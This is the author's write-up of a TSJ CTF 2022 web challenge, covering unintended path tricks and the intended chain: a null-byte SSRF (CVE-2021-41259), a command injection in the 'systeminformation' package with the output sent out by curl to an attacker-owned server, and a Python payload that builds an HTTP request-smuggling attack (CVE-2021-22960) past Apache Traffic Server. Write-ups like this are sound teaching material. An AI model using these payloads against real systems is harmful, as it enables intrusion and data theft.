# Introduction

There are two parts to this challenge. The first part is a web server run by Nim, and the other web server is a web server run by Node.js. An Apache Traffic Server is used as a proxy before you can access these two web servers.

Although some people mentioned that they learned a lot from this challenge, or they really enjoy solving it, I have to apologize for totally messing it up. It should be a more interesting and enjoyable challenge than it presents. But since I have already given the idea in the flag (HR5, although it seems like most people did not notice that during the CTF), I decided not to deploy a modified version.

But still, it's not all that bad, I guess. It became a challenge with most solves and gave an excellent experience for teams that had a hard time with other tough challenges.

I am going to talk about the unintended solution and the intended one, hope you enjoy.

# The Unintended Way

For the Nim web server, you can get the key by making the `hello` string in the function `hello_from_the_world` to a segment or parameter. Both "http://127.0.0.1:80/key#hello" and  "http://127.0.0.1:80/key?hello" work, and even "http://localhost/?" works.

The other way, which can give you both direct access to the `key` endpoint from Nim server and `admin` endpoint from Node.js server, is double slash. You can do it with "http://34.81.54.62:5487/hello-from-the-world//key" and "http://34.81.54.62:5487/service-info//admin".

# The Intended Way

Now, let's talk about the intended way.

For the Nim server, it was intended to get the key based on SSRF in `CVE-2021-41259`. Basically, you can use the null byte `\0` to ignore the `hello` string behind it in the function `getContent`.

To get the flag, there's a command injection in the "systeminformation" package in Node.js. We can send an array to bypass the sanitizer. The result is not shown directly on the response, so you can use `curl` to send the result to your server or any owned domain.

The way to access the `admin` endpoint was based on `CVE-2021-22960`, which is HTTP Request Smuggling.
In Node.js 16.6.0, when we are in chunked mode, the llhttp parser thinks the chunk length ends after it encounters `\r`. However, for Apache Traffic Server, it thinks the chunk length ends after it encounters `\n`.

```python
smuggled = (
    b"POST /admin HTTP/1.1\r\n" +
    f"Host: {host}:{port}\r\n".encode() +
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    smuggled_data_length + b"\r\n" +
    smuggled_data + b"\r\n" +
    b"0\r\n" + 
    b"\r\n"
)
payload = (
    b"GET /service-info/ HTTP/1.1\r\n" +
    f"Host: {host}:{port}\r\n".encode() +
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    first_chunk_len + b" \n" + b"x"*len(smuggled_len) + b"\r\n" +
    smuggled_len + b"\r\n" +
    b"0\r\n" +
    b"\r\n" +
    smuggled
)
```

So, for Apache Traffic Server, `first_chunk_len` will be the chunk length, and `b"x"*len(smuggled_len)` will be the data. `smuggled_len` will be the next chunk length, with the data `b"0\r\n"+b"\r\n"+smuggled`, except the last 2 lines in `smuggled`. The second to last line in `smuggled` is the last chunk length, making an end to the chunked-mode request.

However, for Node.js, `first_chunk_len + b" \n" + b"x"*len(smuggled_len) + b"\r\n"` will be read at once, and `first_chunk_len` will be the chunk length. Its data will be `smuggled_len`. The next chunk length is `0`, telling the chunk-mode request has ended. In that case, the whole `smuggled` will be the second request, which bypass the Apache Traffic Server and sends out a request to `admin`.

## Notes

The `HRS` stands for `HTTP Request Smuggling`. Although you don't really need that to solve this challenge, which is pretty unfortunate.

Thanks to everyone playing TSJ CTF 2022. I will give out better challenges next year if there is TSJ CTF 2023 XD.

# Reference
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41259
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21315
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22960